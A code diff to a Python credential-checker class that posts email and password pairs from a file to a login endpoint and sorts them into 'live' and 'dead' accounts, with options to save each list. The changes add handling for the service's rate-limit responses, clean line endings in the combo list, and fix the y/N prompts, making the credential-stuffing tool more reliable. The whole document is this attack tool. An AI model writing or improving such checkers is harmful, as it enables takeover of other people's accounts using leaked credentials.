@@ -13,22 +13,27 @@ class Main:
         }
         
     def checker(self, email, password):
-        resp = requests.post(self.url, json={'username': email, 'password': password}).json()
+        resp = requests.post(self.url, json={'username': email, 'password': password})
         
-        if resp.get('errors') != None:
-            return {'process': False, 'message': resp['errors']['message'], 'data': {'email': email, 'password': password}}
         
-        elif resp.get('user_id') != None:
-            return {'process': True, 'data': {'email': email, 'password': password, 'expires_at': resp['expires_at']}}
+        if 'Too Many Requests' in resp.text:
+            return {'process': False, 'message': 'Too Many Requests', 'data': {'email': email, 'password': password}}
+    
+        resp_json = resp.json()
+    
+        if resp_json.get('errors') != None:
+            return {'process': False, 'message': resp_json['errors']['message'], 'data': {'email': email, 'password': password}}
         
-        else:
-            return {'process': False, 'message': resp}
+        elif resp_json.get('user_id') != None:
+            return {'process': True, 'data': {'email': email, 'password': password, 'expires_at': resp_json['expires_at']}}
+
+
         
     def read(self, filename):
         output = []
         with open(filename, 'rb') as file:
             for i in file.readlines():
-                output.append(i.decode().replace('\n', ''))
+                output.append(i.decode().replace('\n', '').replace('\r', ''))
             file.close()
         return output
     
@@ -37,8 +42,8 @@ class Main:
         
     def save_live(self):
         resp = input("=>> Save live accounts? [y/N]:  ")
-        if resp == 'y'.lower():self.data['save_live'] = True
-        elif resp == 'N'.lower():self.data['save_live'] = False
+        if resp.lower() == 'y':self.data['save_live'] = True
+        elif resp.upper() == 'N':self.data['save_live'] = False
         else:
             print("\033[91m[!!] Invalid option\033[00m")
             sys.exit()
@@ -46,8 +51,8 @@ class Main:
         
     def save_dead(self):
         resp = input("=>> Save dead accounts? [y/N]:  ")
-        if resp == 'y'.lower():self.data['save_dead'] = True
-        elif resp == 'N'.lower():self.data['save_dead'] = False
+        if resp.lower() == 'y':self.data['save_dead'] = True
+        elif resp.upper() == 'N':self.data['save_dead'] = False
         else:
             print("\033[91m[!!] Invalid option\033[00m")
             sys.exit()
